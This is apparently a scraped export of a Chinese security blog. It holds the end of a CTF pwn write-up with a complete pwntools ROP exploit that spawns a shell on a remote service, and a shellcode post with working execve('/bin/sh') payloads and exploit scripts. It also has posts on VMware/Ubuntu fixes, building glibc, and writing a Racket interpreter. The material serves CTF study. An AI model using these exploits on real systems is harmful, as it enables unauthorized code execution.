gets_plt, # rop6_1 pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2 pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32 pop_rsi_r15_ret, offset, 8, add_ebx_esi_ret, libc_csu_init, pop_rbp_ret, buf4 - 8, leave_ret] 加完之后发现只留了地址的低四位，高四位被弄丢了。我们需要做的就是把所有的 offset 加上 4，这样同样的做法我们就能拿到高四位的值。因为栈其实是不需要对齐的，所以这样做是可以的。这样的话之后的操作大部分细节和之前是一样的，后面就不用加 offset 了。然后需要计算一下之前的低四位在栈上的什么地方，计算好位置之后读上去： 12345678910111213141516171819202122232425262728293031323334rop7 = [ # buf4 pop_rdi_ret, gets_got + 28, gets_plt, # rop8 pop_rbp_ret, buf5 - 8, pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28 leave_ret]rop9 = [ # buf5 libc_csu_init, pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6 pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1 pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2 pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32 pop_rdi_ret, buf2 + 68, gets_plt, # rop12 pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164 libc_csu_init, pop_rbp_ret, buf7 - 8, leave_ret] 最后 system 的地址已经在栈上了，读一下参数，利用__libc_csu_init()调用一下就行了： 123456rop13 = [ pop_rdi_ret, buf8, gets_plt, # shell command pop_rdi_ret, buf8, pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0, call_at_r12] Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 0if local: p = remote('127.0.0.1', 4000) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('10.21.13.69', 10010) libc = ELF('libc.so.6')elf = ELF('./gets')g = lambda x: next(elf.search(asm(x)))system_offset = libc.symbols['system']gets_offset = libc.symbols['gets']offset = system_offset - gets_offsetif offset &lt; 0: offset &amp;= 0xffffffffgets_plt = elf.plt['gets']gets_got = elf.got['gets']libc_csu_init = elf.symbols['__libc_csu_init']pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')pop_rbp_ret = g('pop rbp ; ret')pop_rdi_ret = g('pop rdi ; ret')pop_r15_ret = g('pop r15 ; ret')pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')add_ebx_esi_ret = g('add ebx, esi ; ret')leave_ret = g('leave ; ret')call_at_r12 = g('call QWORD PTR [r12+rbx*8]')# gdb.attach(p)bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800rop1 = [ pop_rdi_ret, buf1, gets_plt, # rop2 pop_rdi_ret, buf2, gets_plt, # rop4 pop_rdi_ret, buf3, gets_plt, # rop5 pop_rdi_ret, buf4, gets_plt, # rop7 pop_rdi_ret, buf5, gets_plt, # rop9 pop_rdi_ret, buf6, gets_plt, # rop10 pop_rdi_ret, buf7, gets_plt, # rop13 pop_rbp_ret, buf1 - 8, leave_ret]rop2 = [ # buf1 pop_rdi_ret, gets_got + 24, gets_plt, # rop3 pop_rbp_ret, buf2 - 8, pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24 leave_ret]rop4 = [ # buf2 libc_csu_init, pop_rbp_ret, buf3 - 8, leave_ret]rop5 = [ # buf3 pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1 pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2 pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32 pop_rsi_r15_ret, offset, 8, add_ebx_esi_ret,# 0xdeadbeef, libc_csu_init, pop_rbp_ret, buf4 - 8, leave_ret]rop7 = [ # buf4 pop_rdi_ret, gets_got + 28, gets_plt, # rop8 pop_rbp_ret, buf5 - 8, pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28 leave_ret]rop9 = [ # buf5 libc_csu_init, pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6 pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1 pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2 pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32 pop_rdi_ret, buf2 + 68, gets_plt, # rop12 pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164 libc_csu_init, pop_rbp_ret, buf7 - 8, leave_ret]rop13 = [ pop_rdi_ret, buf8, gets_plt, # shell command pop_rdi_ret, buf8, pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0, call_at_r12]payload = ( 'A' * 24 + ''.join(map(p64, rop1)) + '\\n' + ''.join(map(p64, rop2)) + '\\n' + ''.join(map(p64, rop4)) + '\\n' + ''.join(map(p64, rop5)) + '\\n' + ''.join(map(p64, rop7)) + '\\n' + ''.join(map(p64, rop9)) + '\\n' + ''.join(map(p64, rop10)) + '\\n' + ''.join(map(p64, rop13)) + '\\n' + ''.join(map(p64, rop3))[:-1] + '\\n' + ''.join(map(p64, rop6_1))[:-1] + '\\n' + ''.join(map(p64, rop6_2)) + '\\n' + ''.join(map(p64, rop8)) + '\\n' + ''.join(map(p64, rop11_1))[:-1] + '\\n' + ''.join(map(p64, rop11_2)) + '\\n' + ''.join(map(p64, rop12)) + '\\n' + 'sh\\n')p.send(payload)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"解决VMware下Ubuntu的一些问题","slug":"解决VMware下Ubuntu的一些问题","date":"2019-03-06T02:57:51.000Z","updated":"2019-08-26T05:54:03.285Z","comments":true,"path":"2019/03/06/解决VMware下Ubuntu的一些问题/","link":"","permalink":"qianfei11.coding.me/2019/03/06/解决VMware下Ubuntu的一些问题/","excerpt":"记录一些在虚拟机上的问题。","text":"记录一些在虚拟机上的问题。 0x0 更新出错（Sub-process returned an error code）装了个优麒麟（Ubuntu Kylin），更新的时候居然报错了。 在sudo apt-get update后出现： 1234Aborted (core dumped)Reading package lists... DoneE: Problem executing scripts APT::Update::Post-Invoke-Success 'if /usr/bin/test -w /var/cache/app-info -a -e /usr/bin/appstreamcli; then appstreamcli refresh &gt; /dev/null; fi'E: Sub-process returned an error code 大概跟一个安装包libappstream3有关，remove 掉就行了： 1sudo apt-get remove libappstream3 0x1 无法显示图形化界面12**The system is running in low-graphics mode**Your screen, graphics cards, and input device settings could not be detected correctly. You will need to configure these yourself. 装一下 vm 桌面，再更新一下磁盘： 12345sudo apt-get updatesudo apt-get install open-vm-toolssudo apt-get install open-vm-tools-desktopsudo rebootsudo apt-get dist-upgrade 0x2 无法开机1intel_rapl: no valid rapl domains found in package 0 在 vmware 的.vmx文件中添加paevm = &quot;TRUE&quot;。如果还不能解决，说明电脑的 cpu 不支持 PAE。直接在文件/etc/modprobe.d/blacklist.conf中添加blacklist intel_rapl后重启。 0x3 开机显示异常1piix4_smbus ****host smbus controller not enabled 在文件/etc/modprobe.d/blacklist.conf中添加blacklist piix4_smbus后重启。 0x4 开启后跳出提示框（Could not apply the stored configuration for monitors）这个弹出窗口的意思是，不能应用当前显示器的设置，也就是显示器的设置有错误。在关机的时候，系统会保存上一次的设置，在$HOME/.config下生成一个monitors.xml的文件。只需要把这个文件删除即可： 1sudo rm -rf ~/.config/monitors.xml 参考网站https://blog.csdn.net/xiaxuesong666/article/details/77072770https://askubuntu.com/questions/998318/the-system-is-running-in-low-graphics-mode-error-after-installing-vmware-toolshttp://www.it610.com/article/3346432.htmhttps://blog.csdn.net/think_embed/article/details/8805510","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"qianfei11.coding.me/tags/linux/"},{"name":"solution","slug":"solution","permalink":"qianfei11.coding.me/tags/solution/"}]},{"title":"Ubuntu16.04下编译libc2.23","slug":"Ubuntu16-04下编译libc2-23","date":"2019-03-04T13:31:41.000Z","updated":"2019-08-26T05:50:19.851Z","comments":true,"path":"2019/03/04/Ubuntu16-04下编译libc2-23/","link":"","permalink":"qianfei11.coding.me/2019/03/04/Ubuntu16-04下编译libc2-23/","excerpt":"为了更好地调试堆，需要自己编译一个带 symbol 的 libc。","text":"为了更好地调试堆，需要自己编译一个带 symbol 的 libc。 环境和工具 Ubuntu16.04 glibc-2.23.tar.gz 12assassinq@ubuntu ~/glibc-2.23/build$ uname -aLinux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 准备工作从 ftp 上把 glibc 下载下来，解压后新建一个 build 文件夹： 123cd &amp;&amp; wget http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz \\tar -xvf glibc-2.23.tar.gz &amp;&amp; cd glibc-2.23 \\mkdir build &amp;&amp; cd build # mkdir build32 &amp;&amp; cd build32 编译过程中的挖坑和填坑在 build 文件夹下 configure，并且加上一些必要的参数使得编译时加上 symbol，并且指定输出文件夹：（转自2016 年 winesap 的社课） 123456789# x64CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\../configure --prefix=/path/to/install# x32CC=\"gcc -m32\" CXX=\"g++ -m32\" \\CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\../configure --prefix=/path/to/install --host=i686-linux-gnu 如果没有任何意外的话就能直接make &amp;&amp; make install编译了。下面记录一下遇到的几个坑。（感谢n132 大哥的博客） 0x0 某些安装包缺失configure 的时候提示有些安装包缺失，不能生成 Makefile： 123configure: error:*** These critical programs are missing or too old: gawk*** Check the INSTALL file for required versions. 根据提示安装一下即可： 1sudo apt-get update &amp;&amp; sudo apt-get install gawk 0x1 警告提示1234567891011121314In file included from regex.c:67:0:regexec.c: In function ‘check_node_accept_bytes’:regexec.c:3856:29: error: ‘extra’ may be used uninitialized in this function [-Werror=maybe-uninitialized] const unsigned char *coll_sym = extra + cset-&gt;coll_syms[i]; ^cc1: all warnings being treated as errors../o-iterator.mk:9: recipe for target &apos;/home/assassinq/glibc-2.23/build/posix/regex.o&apos; failedmake[2]: *** [/home/assassinq/glibc-2.23/build/posix/regex.o] Error 1make[2]: Leaving directory &apos;/home/assassinq/glibc-2.23/posix&apos;Makefile:214: recipe for target &apos;posix/subdir_lib&apos; failedmake[1]: *** [posix/subdir_lib] Error 2make[1]: Leaving directory &apos;/home/assassinq/glibc-2.23&apos;Makefile:9: recipe for target &apos;all&apos; failedmake: *** [all] Error 2 cc1: all warnings being treated as errors是因为设置了警告提示，这里可以回到之前 configure 的时候，CFLAGS新增加一个参数-Wno-error来去除警告： 1CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error\" 0x2 ld.so.conf缺失12/home/assassinq/glibc-2.23/build/elf/ldconfig: Warning: ignoring configuration file that cannot be opened: /home/assassinq/glibc-2.23/64/etc/ld.so.conf: No such file or directorymake[1]: Leaving directory &apos;/home/assassinq/glibc-2.23&apos; 这里只需要直接 touch 一个新文件即可： 1cd ../64/etc &amp;&amp; sudo touch ld.so.conf 调试记录一下调_dl_runtime_resolve的 Makefile： 123all: aa: a.c gcc a.c -o a -Wl, -dynamic-linker /path/to/install/lib/ld-2.23.so -g 参考网站https://n132.github.io/2018/04/30/2018-04-30-%E7%BC%96%E8%AF%91-Libc-2-23/https://www.youtube.com/watch?v=wsIvqd9YqTI&amp;feature=share","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"qianfei11.coding.me/tags/linux/"}]},{"title":"Shellcode Tricks","slug":"[TODO]Shellcode-Tricks","date":"2019-03-02T11:05:59.000Z","updated":"2020-02-09T08:47:33.035Z","comments":true,"path":"2019/03/02/[TODO]Shellcode-Tricks/","link":"","permalink":"qianfei11.coding.me/2019/03/02/[TODO]Shellcode-Tricks/","excerpt":"The Splendid Shellcode.","text":"The Splendid Shellcode. Shellcode 是一串可以直接被执行的机器码，可以用来获得 Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。 可以控制程序执行流，可以控制一定的 data； 利用mprotect()或者_dl_make_stack_executable()改写某些区域的 porc 再执行。 关于 System Call： 1sys_execve( const char *filename, char *const argv[], char *const envp[] ); 目标： 1execve(\"/bin/sh\", 0, 0); System Call x86： eax ebx ecx edx else 0xb addr of “/bin/sh” 0 0 int 0x80 System Call x64： rax rdi rsi rdx else 59 addr of “/bin/sh” 0 0 syscall Basic Shellcode最基础的 shellcode，对输入的长度没有做任何限制。 shellcodeSource Code： 12345678910// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x20]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 0x20); ptr = buf; ptr();&#125; push 字符串&quot;/bin/sh&quot;，此时 esp 指向字符串，即直接把 esp 的值赋给 ebx 即可。&quot;/bin/sh&quot;的值可以在 gdb 调试中searchmem /bin/sh得到。Shellcode 的长度为 29。 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'i386'sh = asm(''' mov eax, 0xb mov ecx, 0 mov edx, 0 push 0x68732f push 0x6e69622f mov ebx, esp int 0x80''')info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x20))p.interactive() shellcode64Source Code： 12345678910// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x40]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 0x40); ptr = buf; ptr();&#125; 64 位下不能直接 push 值，需要通过寄存器 push。Shellcode 的长度为 37 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'amd64'sh = asm(''' mov rax, 59 mov rsi, 0 mov rdx, 0 mov rdi, 0x68732f6e69622f push rdi mov rdi, rsp syscall''')info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x40))p.interactive() Baby Shellcode对接受的字符串长度做了一点限制，需要通过一些 Tricks 来缩短 Shellcode 的长度。 shellcode_20Source Code： 12345678910// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x20]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 20); ptr = buf; ptr();&#125; 32 位下，mov ecx, 0是 5 个字节，而xor ecx, ecx只有 2 个字节，两者同样是给寄存器清零，后者可以省去 3 个字节。mov eax, 0xb同样需要 5 个字节，而在 eax 为 0 的情况下，我们只需要mov al, 0xb，只需要 2 个字节。mul ebx需要 2 个字节，其作用是将 eax 中值与 ebx 相乘，所得结果高位存在 edx，低位存在 eax。在调试中我们发现 ebx 的值为零，此时使用乘法指令可以直接使 eax 和 edx 的值变为 0，可以直接对 al 赋值，同时不用再对 edx 清零。最终 Shellcode 的长度缩短为 20 字节。 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'i386'sh = asm(''' mul ebx mov al, 0xb xor ecx, ecx push 0x0068732f push 0x6e69622f mov ebx, esp int 0x80''')info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x20, '\\x00'))p.interactive() shellcode64_22Source Code： 12345678910// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x40]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 22); ptr = buf; ptr();&#125; 调试中可以发现 rax 和 rbx 的值为 0，我们可以把 7 个字节的mov rax, 59缩短为 2 个字节的mov al, 59。同时清零 rdx 和 rsi 的工作可以通过 xor 来缩短成 3 个字节。然而，通过观察发现，64 位下只能通过寄存器的 push 只需要 1 个字节。如果用 push 和 pop，即push rbx ; pop rsi只需要 2 个字节。后面对 rdi 的赋值也可以通过同样的方式达到目的。最终 Shellcode 的长度缩短为 21 字节。 Exploit： 123456789101112131415161718192021#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'amd64'sh = asm(''' mov al, 59 push rbx push rbx pop rsi pop rdx mov rdi, 0x68732f6e69622f push rdi push rsp pop rdi syscall''')info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x40))p.interactive() Child ShellcodeorwTODO: Death NoteTODO: Adult ShellcodeAlive NoteTODO: Hell ShellcodeMnO2TODO:","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"【转】怎样写一个解释器","slug":"【转】怎样写一个解释器","date":"2019-02-28T05:34:20.000Z","updated":"2019-08-26T01:14:16.600Z","comments":true,"path":"2019/02/28/【转】怎样写一个解释器/","link":"","permalink":"qianfei11.coding.me/2019/02/28/【转】怎样写一个解释器/","excerpt":"转自王垠老师的博客","text":"转自王垠老师的博客 怎样写一个解释器写一个解释器，通常是设计和实现程序语言的第一步。解释器是简单却又深奥的东西，以至于好多人都不会写，所以我决定写一篇这方面的入门读物。 虽然我试图从最基本的原理讲起，尽量不依赖于其它知识，但这并不是一本编程入门教材。我假设你已经理解 Scheme 语言，以及基本的编程技巧（比如递归）。如果你完全不了解这些，那我建议你读一下 SICP 的第一，二章，或者 HtDP 的前几章，习题可以不做。注意不要读太多书，否则你就回不来了 ;-) 当然你也可以直接读这篇文章，有不懂的地方再去查资料。 实现语言容易犯的一个错误，就是一开头就试图去实现很复杂的语言（比如 JavaScript 或者 Python）。这样你很快就会因为这些语言的复杂性，以及各种历史遗留的设计问题而受到挫折，最后不了了之。学习实现语言，最好是从最简单，最干净的语言开始，迅速写出一个可用的解释器。之后再逐步往里面添加特性，同时保持正确。这样你才能有条不紊地构造出复杂的解释器。 因为这个原因，这篇文章只针对一个很简单的语言，名叫“R2”。它可以作为一个简单的计算器用，还具有变量定义，函数定义和调用等功能。 我们的工具：Racket本文的解释器是用 Scheme 语言实现的。Scheme 有很多的“实现”，这里我用的实现叫做 Racket，它可以在这里免费下载。为了让程序简洁，我用了一点点 Racket 的模式匹配（pattern matching）功能。我对 Scheme 的实现没有特别的偏好，但 Racket 方便易用，适合教学。如果你用其它的 Scheme 实现，可能得自己做一些调整。 Racket 具有宏（macro），所以它其实可以变成很多种语言。如果你之前用过 DrRacket，那它的“语言设置”可能被你改成了 R5RS 之类的。所以如果下面的程序不能运行，你可能需要检查一下 DrRacket 的“语言设置”，把 Language 设置成 “Racket”。 Racket 允许使用方括号而不只是圆括号，所以你可以写这样的代码： 123(let ([x 1] [y 2]) (+ x y)) 方括号跟圆括号可以互换，唯一的要求是方括号必须和方括号匹配。通常我喜欢用方括号来表示“无动作”的数据（比如上面的 [x 1], [y 2]），这样可以跟函数调用和其它具有“动作”的代码，产生“视觉差”。这对于代码的可读性是一个改善，因为到处都是圆括号的话，确实有点太单调，容易打瞌睡。 另外，Racket 程序的最上面都需要加上像 #lang racket 这样的语言选择标记，这样 Racket 才可以知道你想用哪个语言变种。 解释器是什么准备工作就到这里。现在我来谈一下，解释器到底是什么。说白了，解释器跟计算器差不多。解释器是一个函数，你输入一个“表达式”，它就输出一个 “值”，像这样： 比如，你输入表达式 ‘(+ 1 2) ，它就输出值，整数 3。表达式是一种“表象”或者“符号”，而值却更加接近“本质”或者“意义”。我们“解释”了符号，得到它的意义，这也许就是为什么它叫做“解释器”。 需要注意的是，表达式是一个数据结构，而不是一个字符串。我们用一种叫“S 表达式”（S-expression）的结构来存储表达式。比如表达式 ‘(+ 1 2) 其实是一个链表（list），它里面的内容是三个符号（symbol）：+, 1 和 2，而不是字符串”(+ 1 2)”。 从 S 表达式这样的“结构化数据”里提取信息，方便又可靠，而从字符串里提取信息，麻烦而且容易出错。Scheme（Lisp）语言里面大量使用结构化数据，少用字符串，这是 Lisp 系统比 Unix 系统先进的地方之一。 从计算理论的角度讲，每个程序都是一台机器的“描述”，而解释器就是在“模拟”这台机器的运转，也就是在进行“计算”。所以从某种意义上讲，解释器就是计算的本质。当然，不同的解释器就会带来不同的计算。 CPU 也是一个解释器，它专门解释执行机器语言。如果你深刻理解了解释器，就可以从本质上看出各种 CPU 的设计为什么是那个样子，它们有什么优缺点，而不只是被动的作为它们的使用者。 抽象语法树（Abstract Syntax Tree）用 S 表达式所表示的代码，本质上是一种叫做“树”（tree）的数据结构。更具体一点，这叫做“抽象语法树”（Abstract Syntax Tree，简称 AST）。下文为了简洁，我们省略掉“抽象”两个字，就叫它“语法树”。 跟普通的树结构一样，语法树里的节点，要么是一个“叶节点”，要么是一颗“子树”。叶节点是不能再细分的“原子”，比如数字，字符串，操作符，变量名。而子树是可以再细分的“结构”，比如算术表达式，函数定义，函数调用，等等。 举个简单的例子，表达式 ‘(* (+ 1 2) (+ 3 4))，就对应如下的语法树结构： 其中，，两个+，1，2，3，4 都是叶节点，而那三个红色节点，都表示子树结构：’(+ 1 2)，’(+ 3 4)，’( (+ 1 2) (+ 3 4))。 树遍历算法在基础的数据结构课程里，我们都学过二叉树的遍历操作，也就是所谓先序遍历，中序遍历和后序遍历。语法树跟二叉树，其实没有很大区别，所以你也可以在它上面进行遍历。解释器的算法，就是在语法树上的一种遍历操作。由于这个渊源关系，我们先来做一个遍历二叉树的练习。做好了之后，我们就可以把这段代码扩展成一个解释器。 这个练习是这样：写出一个函数，名叫 tree-sum，它对二叉树进行“求和”，把所有节点里的数加在一起，返回它们的和。举个例子，(tree-sum ‘((1 2) (3 4)))，执行后应该返回 10。注意：这是一颗二叉树，所以不会含有长度超过 2 的子树，你不需要考虑像 ((1 2) (3 4 5)) 这类情况。需要考虑的例子是像这样：(1 2)，(1 (2 3)), ((1 2) 3) ((1 2) (3 4))，…… （为了达到最好的学习效果，你最好试一下写出这个函数再继续往下看。） 好了，希望你得到了跟我差不多的结果。我的代码是这个样子： 12345678910#lang racket(define tree-sum (lambda (exp) (match exp ; 对输入exp进行模式匹配 [(? number? x) x] ; exp是一个数x吗？如果是，那么返回这个数x [`(,e1 ,e2) ; exp是一个含有两棵子树的中间节点吗？ (let ([v1 (tree-sum e1)] ; 递归调用tree-sum自己，对左子树e1求值 [v2 (tree-sum e2)]) ; 递归调用tree-sum自己，对右子树e2求值 (+ v1 v2))]))) ; 返回左右子树结果v1和v2的和 你可以通过以下的例子来测试它的正确性： 12345678(tree-sum &apos;(1 2));; =&gt; 3(tree-sum &apos;(1 (2 3)));; =&gt; 6(tree-sum &apos;((1 2) 3));; =&gt; 6(tree-sum &apos;((1 2) (3 4)));; =&gt; 10 （完整的代码和示例，可以在这里下载。） 这个算法很简单，我们可以把它用文字描述如下： 如果输入 exp 是一个数，那就返回这个数。 否则如果 exp 是像 (,e1 ,e2) 这样的子树，那么分别对 e1 和 e2 递归调用 tree-sum，进行求和，得到 v1 和 v2，然后返回 v1 + v2 的和。你自己写出来的代码，也许用了 if 或者 cond 语句来进行分支，而我的代码里面使用的是 Racket 的模式匹配（match）。这个例子用 if 或者 cond 其实也可以，但我之后要把这代码扩展成一个解释器，所以提前使用了 match。这样跟后面的代码对比的时候，就更容易看出规律来。接下来，我就简单讲一下这个 match 表达式的工作原理。 模式匹配现在不得不插入一点 Racket 的技术细节，如果你已经学会使用 Racket 的模式匹配，可以跳过这一节。你也可以通过阅读 Racket 模式匹配的文档来代替这一节。但我建议你不要读太多文档，因为我接下去只用到很少的模式匹配功能，我把它们都解释如下。 模式匹配的形式一般是这样： 12345(match x [模式 结果] [模式 结果] ... ...) 它先对 x 求值，然后根据值的结构来进行分支。每个分支由两部分组成，左边是一个模式，右边是一个结果。整个 match 语句的语义是这样：从上到下依次考虑，找到第一个可以匹配 x 的值的模式，返回它右边的结果。左边的模式在匹配之后，可能会绑定一些变量，这些变量可以在右边的表达式里使用。 模式匹配是一种分支语句，它在逻辑上就是 Scheme（Lisp） 的 cond 表达式，或者 Java 的嵌套条件语句 if … else if … else …。然而跟条件语句里的“条件”不同，每条 match 语句左边的模式，可以准确而形象地描述数据结构的形状，而且可以在匹配的同时，对结构里的成员进行“绑定”。这样我们可以在右边方便的访问结构成员，而不需要使用访问函数（accessor）或者 foo.x 这样的属性语法（attribute）。而且模式可以有嵌套的子结构，所以它能够一次性的表示复杂的数据结构。 举个实在点的例子。我的代码里用了这样一个 match 表达式： 123456(match exp [(? number? x) x] [`(,e1 ,e2) (let ([v1 (tree-sum e1)] [v2 (tree-sum e2)]) (+ v1 v2))]) 第二行里面的 ‘(,e1 ,e2) 是一个模式（pattern），它被用来匹配 exp 的值。如果 exp 是 ‘(1 2)，那么它与’(,e1 ,e2)匹配的时候，就会把 e1 绑定到 ‘1，把 e2 绑定到 ‘2。这是因为它们结构相同： 12`(,e1 ,e2)&apos;( 1 2) 说白了，模式就是一个可以含有“名字”（像 e1 和 e2）的结构，像 ‘(,e1 ,e2)。我们拿这个带有名字的结构，去匹配实际数据，像 ‘(1 2)。当它们一一对应之后，这些名字就被绑定到数据里对应位置的值。 第一行的“模式”比较特殊，(? number? x) 表示的，其实是一个普通的条件判断，相当于 (number? exp)，如果这个条件成立，那么它把 exp 的值绑定到 x，这样右边就可以用 x 来指代 exp。对于无法细分的结构（比如数字，布尔值），你只能用这种方式来“匹配”。看起来有点奇怪，不过习惯了就好了。 模式匹配对解释器和编译器的书写相当有用，因为程序的语法树往往具有嵌套的结构。不用模式匹配的话，往往要写冗长，复杂，不直观的代码，才能描述出期望的结构。而且由于结构的嵌套比较深，很容易漏掉边界情况，造成错误。模式匹配可以直观的描述期望的结构，避免漏掉边界情况，而且可以方便的访问结构成员。 由于这个原因，很多源于 ML 的语言（比如 OCaml，Haskell）都有模式匹配的功能。因为 ML（Meta-Language）原来设计的用途，就是用来实现程序语言的。Racket 的模式匹配也是部分受了 ML 的启发，实际上它们的原理是一模一样的。 好了，树遍历的练习就做到这里。然而这跟解释器有什么关系呢？下面我们只把它改一下，就可以得到一个简单的解释器。 一个计算器计算器也是一种解释器，只不过它只能处理算术表达式。我们的下一个目标，就是写出一个计算器。如果你给它 ‘(* (+ 1 2) (+ 3 4))，它就输出 21。可不要小看这个计算器，稍后我们把它稍加改造，就可以得到一个更多功能的解释器。 上面的代码里，我们利用递归遍历，对树里的数字求和。那段代码里，其实已经隐藏了一个解释器的框架。你观察一下，一个算术表达式 ‘(_ (+ 1 2) (+ 3 4))，跟二叉树 ‘((1 2) (3 4)) 有什么不同？发现没有，这个算术表达式比起二叉树，只不过在每个子树结构里多出了一个操作符：一个 _ 和两个 + 。它不再是一棵二叉树，而是一种更通用的树结构。 这点区别，也就带来了二叉树求和与解释器算法的区别。对二叉树进行求和的时候，在每个子树节点，我们都做加法。而对表达式进行解释的时候，在每一个子树节点，我们不一定进行加法。根据子树的“操作符”不同，我们可能会选择加，减，乘，除四种操作。 好了，下面就是这个计算器的代码。它接受一个表达式，输出一个数字作为结果。 1234567891011121314#lang racket ; 声明用 Racket 语言(define calc (lambda (exp) (match exp ; 分支匹配：表达式的两种情况 [(? number? x) x] ; 是数字，直接返回 [`(,op ,e1 ,e2) ; 匹配提取操作符op和两个操作数e1,e2 (let ([v1 (calc e1)] ; 递归调用 calc 自己，得到 e1 的值 [v2 (calc e2)]) ; 递归调用 calc 自己，得到 e2 的值 (match op ; 分支匹配：操作符 op 的 4 种情况 [&apos;+ (+ v1 v2)] ; 如果是加号，输出结果为 (+ v1 v2) [&apos;- (- v1 v2)] ; 如果是减号，乘号，除号，相似的处理 [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))]))) 你可以得到如下的结果： 123456(calc &apos;(+ 1 2));; =&gt; 3(calc &apos;(* 2 3));; =&gt; 6(calc &apos;(* (+ 1 2) (+ 3 4)));; =&gt; 21 （完整的代码和示例，可以在这里下载。） 跟之前的二叉树求和代码比较一下，你会发现它们惊人的相似，因为解释器本来就是一个树遍历算法。不过你发现它们有什么不同吗？它们的不同点在于： 算术表达式的模式里面，多出了一个“操作符”（op）叶节点：(,op ,e1 ,e2) 对子树 e1 和 e2 分别求值之后，我们不是返回 (+ v1 v2)，而是根据 op 的不同，返回不同的结果： 12345(match op [&apos;+ (+ v1 v2)] [&apos;- (- v1 v2)] [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]) 最后你发现，一个算术表达式的解释器，不过是一个稍加扩展的树遍历算法。 